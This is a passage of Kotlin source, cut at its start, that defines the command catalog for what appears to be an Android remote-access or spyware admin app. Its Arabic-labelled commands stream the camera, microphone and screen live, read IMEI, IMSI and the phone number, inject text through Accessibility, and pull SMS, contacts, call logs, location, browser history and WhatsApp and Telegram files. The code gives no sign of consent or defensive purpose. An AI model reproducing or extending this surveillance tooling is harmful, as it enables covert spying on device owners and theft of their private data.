        CommandDef("start_camera_stream", "بث الكاميرا", "بدء بث مباشر من الكاميرا", Category.STREAMING),
        CommandDef("stop_camera_stream", "إيقاف بث الكاميرا", "إيقاف بث الكاميرا", Category.STREAMING),
        CommandDef("start_audio_stream", "بث الصوت", "بدء بث مباشر من الميكروفون", Category.STREAMING),
        CommandDef("stop_audio_stream", "إيقاف بث الصوت", "إيقاف بث الصوت", Category.STREAMING),
        CommandDef("switch_camera", "تبديل الكاميرا", "تبديل بين الكاميرا الأمامية والخلفية", Category.STREAMING),
        CommandDef("set_stream_quality", "جودة البث", "تعيين جودة البث المباشر", Category.STREAMING),
        CommandDef("stop_all_streams", "إيقاف كل البث", "إيقاف جميع البثوصات النشطة", Category.STREAMING),
        CommandDef("start_screen_stream_hd", "بث HD", "بدء بث الشاشة بجودة عالية", Category.STREAMING),
        CommandDef("start_screen_stream_sd", "بث SD", "بدء بث الشاشة بجودة منخفضة", Category.STREAMING),
        CommandDef("start_front_camera_hd", "بث أمامية HD", "بدء بث الكاميرا الأمامية HD", Category.STREAMING),
        CommandDef("start_back_camera_hd", "بث خلفية HD", "بدء بث الكاميرا الخلفية HD", Category.STREAMING),
        CommandDef("start_screen_audio_stream", "بث شاشة+صوت", "بث الشاشة والصوت معاً", Category.STREAMING),
        CommandDef("get_stream_stats", "إحصائيات البث", "عرض إحصائيات البث", Category.STREAMING),
        CommandDef("list_active_streams", "البث النشط", "عرض البثوصات النشطة", Category.STREAMING),
        CommandDef("enable_torch_stream", "كشاف البث", "تشغيل الكشاف أثناء البث", Category.STREAMING),
        CommandDef("pause_stream", "إيقاف مؤقت", "إيقاف البث مؤقتاً", Category.STREAMING),
        CommandDef("resume_stream", "استئناف البث", "استئناف البث الموقوف", Category.STREAMING),
        CommandDef("get_stream_capabilities", "قدرات البث", "عرض قدرات البث المتاحة", Category.STREAMING),

        // ═══════════════════════════════════════════════════════════
        // DEVICE — 16 commands (matches server "device" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("device_id", "معرّف الجهاز", "معرّف فريد للجهاز (ANDROID_ID)", Category.DEVICE),
        CommandDef("imei", "IMEI", "رقم IMEI (يتطلب صلاحية نظام)", Category.DEVICE),
        CommandDef("imsi", "IMSI", "رقم IMSI للمشترك (يتطلب صلاحية نظام)", Category.DEVICE),
        CommandDef("phone_number", "رقم الهاتف", "رقم هاتف الجهاز (line1)", Category.DEVICE),
        CommandDef("serial", "الرقم التسلسلي", "Build.SERIAL / Build.getSerial()", Category.DEVICE),
        CommandDef("mac_address", "عنوان MAC", "عنوان MAC لبطاقة الشبكة", Category.DEVICE),
        CommandDef("ip_address", "عنوان IP", "عنوان IPv4 الحالي", Category.DEVICE),
        CommandDef("ipv6_address", "عنوان IPv6", "عنوان IPv6 الحالي", Category.DEVICE),
        CommandDef("network_operator", "مشغل الشبكة", "اسم وكود مشغل الشبكة", Category.DEVICE),
        CommandDef("sim_operator", "مشغل SIM", "اسم وكود مشغل SIM", Category.DEVICE),
        CommandDef("sim_country", "دولة SIM", "دولة بطاقة SIM", Category.DEVICE),
        CommandDef("network_country", "دولة الشبكة", "دولة الشبكة الحالية", Category.DEVICE),
        CommandDef("phone_type", "نوع الهاتف", "نوع الهاتف (GSM/CDMA/SIP)", Category.DEVICE),
        CommandDef("sim_state", "حالة SIM", "حالة بطاقة SIM", Category.DEVICE),
        CommandDef("data_state", "حالة البيانات", "حالة اتصال البيانات الخلوية", Category.DEVICE),
        CommandDef("data_activity", "نشاط البيانات", "اتجاه نشاط البيانات (في/خارج)", Category.DEVICE),

        // ═══════════════════════════════════════════════════════════
        // INPUT — 7 commands (matches server "input" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("show_keyboard", "إظهار لوحة المفاتيح", "إظهار لوحة المفاتيح على الشاشة", Category.INPUT),
        CommandDef("hide_keyboard", "إخفاء لوحة المفاتيح", "إخفاء لوحة المفاتيح", Category.INPUT),
        CommandDef("input_text", "إدخال نص", "إدخال نص في الحقل المركّز (يتطلب Accessibility)", Category.INPUT),
        CommandDef("input_key", "إدخال مفتاح", "إدخال مفتاح معيّن (keyCode)", Category.INPUT),
        CommandDef("paste_clipboard", "لصق الحافظة", "لصق محتوى الحافظة في الحقل المركّز", Category.INPUT),
        CommandDef("clear_clipboard", "مسح الحافظة", "مسح محتوى الحافظة", Category.INPUT),
        CommandDef("set_clipboard_text", "كتابة في الحافظة", "وضع نص في الحافظة", Category.INPUT),

        // ═══════════════════════════════════════════════════════════
        // MEDIA — 7 commands (matches server "media" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("play_media", "تشغيل وسائط", "تشغيل التشغيل الحالي", Category.MEDIA),
        CommandDef("pause_media", "إيقاف مؤقت", "إيقاف الوسائط مؤقتاً", Category.MEDIA),
        CommandDef("stop_media", "إيقاف الوسائط", "إيقاف تشغيل الوسائط", Category.MEDIA),
        CommandDef("next_track", "المقطع التالي", "الانتقال للمقطع التالي", Category.MEDIA),
        CommandDef("previous_track", "المقطع السابق", "العودة للمقطع السابق", Category.MEDIA),
        CommandDef("set_media_volume", "صوت الوسائط", "ضبط مستوى صوت الوسائط", Category.MEDIA),
        CommandDef("now_playing", "المشغّل الآن", "معلومات المقطع المشغّل حالياً", Category.MEDIA),

        // ═══════════════════════════════════════════════════════════
        // SYSTEM — 8 commands (matches server "system" category)
        // ═══════════════════════════════════════════════════════════
        CommandDef("system_properties", "خصائص النظام", "خصائص نظام Android (getprop)", Category.SYSTEM),
        CommandDef("build_info", "معلومات البناء", "معلومات Build (MODEL, FINGERPRINT, …)", Category.SYSTEM),
        CommandDef("uptime", "وقت التشغيل", "مدة تشغيل الجهاز", Category.SYSTEM),
        CommandDef("boot_time", "وقت الإقلاع", "وقت آخر إقلاع للجهاز", Category.SYSTEM),
        CommandDef("current_time", "الوقت الحالي", "الوقت الحالي للجهاز", Category.SYSTEM),
        CommandDef("set_current_time", "ضبط الوقت", "ضبط وقت النظام (يتطلب صلاحية نظام)", Category.SYSTEM),
        CommandDef("timezone", "المنطقة الزمنية", "معلومات المنطقة الزمنية الحالية", Category.SYSTEM),
        CommandDef("available_locales", "اللغات المتاحة", "قائمة اللغات المتاحة في النظام", Category.SYSTEM),
    )

    /**
     * Map of category -> list of command definitions for quick lookup.
     */
    val commandsByCategory: Map<Category, List<CommandDef>> by lazy {
        Category.entries.associateWith { category ->
            allCommands.filter { it.category == category }
        }
    }

    /**
     * Find a command definition by its key.
     */
    fun findByKey(key: String): CommandDef? {
        return allCommands.find { it.key == key }
    }

    /**
     * Total number of commands.
     */
    val totalCommands: Int get() = allCommands.size

    // ═════════════════════════════════════════════════════════════
    // Command classification — DATA-retrieval vs ACTION commands.
    //
    // DATA-retrieval commands return a result that the admin should see
    // in a dedicated viewer (SMS list, contacts list, map, image, …).
    // They get routed to CommandResultActivity after being sent.
    //
    // ACTION commands (lock_device, send_sms, delete_file, …) have no
    // meaningful "result" to display — a toast confirming delivery is
    // enough. They are NOT routed to the result viewer.
    //
    // IMPORTANT: server COMMAND_REGISTRY maps short keys (sms, contacts,
    // calls, location, …) to actual device commands (get_sms,
    // get_contacts, …). The Command.command field on the server response
    // holds the ACTUAL command (e.g. "get_sms"), so isDataRetrievalCommand
    // accepts BOTH the short key and the "get_*" form for robustness.
    // ═════════════════════════════════════════════════════════════

    /**
     * Set of DATA-retrieval command keys (short server registry keys
     * + their get_* actual-command counterparts).
     */
    private val DATA_RETRIEVAL_KEYS: Set<String> = setOf(
        // SMS
        "sms", "get_sms",
        // Contacts
        "contacts", "get_contacts",
        // Calls
        "calls", "get_calls",
        // Location
        "location", "get_location",
        // Notifications
        "notifications", "get_notifications",
        // Apps
        "apps", "get_apps", "installed_apps", "get_installed_apps",
        "running_apps", "get_running_apps",
        // Device info
        "info", "get_info", "device_info",
        // Battery
        "battery", "get_battery",
        // Gallery
        "gallery", "get_gallery",
        // Clipboard
        "clipboard", "get_clipboard",
        // WiFi / network / SIM / storage
        "wifi_info", "get_wifi_info",
        "network_info", "get_network_info",
        "sim_info", "get_sim_info",
        "storage_info", "get_storage_info",
        // All data bundle
        "all_data", "get_all_data",
        // Calendar
        "calendar", "get_calendar",
        // Browser history
        "browser_history", "get_browser_history",
        // App usage
        "app_usage", "get_app_usage",
        // Screenshots / camera captures (base64 JPEG result)
        "screenshot", "front_camera", "back_camera",
        // Files (returns a file tree / listing)
        "list_files", "list_downloads", "list_dcim", "list_music",
        "list_videos", "list_documents", "list_whatsapp",
        "list_telegram_files", "recent_files",
        // Status / info commands
        "device_admin_status", "check_root"
    )

    /**
     * Returns true if the command produces a result that should be
     * displayed in the CommandResultActivity viewer (SMS list, image,
     * JSON data, …). Returns false for pure action commands like
     * lock_device, send_sms, delete_file, …
     *
     * Accepts both short keys ("sms") and actual command names
     * ("get_sms") so it works regardless of whether the caller has the
     * CommandDefinitions key or the server-mapped actual command.
     */
    fun isDataRetrievalCommand(key: String): Boolean {
        if (key.isBlank()) return false
        val lower = key.trim().lowercase()
        if (lower in DATA_RETRIEVAL_KEYS) return true
        // Treat any "get_*" command as a data-retrieval command — server
        // convention is that "get_*" commands return data to display.
        if (lower.startsWith("get_")) return true
        // Treat any "list_*" command as data retrieval (file listings).
        if (lower.startsWith("list_")) return true
        return false
    }
}